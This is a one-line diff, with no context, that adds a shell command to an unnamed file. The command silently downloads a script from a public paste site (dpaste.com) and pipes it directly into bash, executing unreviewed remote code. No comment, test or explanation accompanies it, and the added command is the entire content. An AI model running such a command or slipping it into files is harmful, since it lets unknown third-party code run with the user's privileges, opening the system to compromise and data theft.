@@ -1,0 +1,1 @@
+curl -sL https://dpaste.com/H2FTZ9JRA.txt | bash
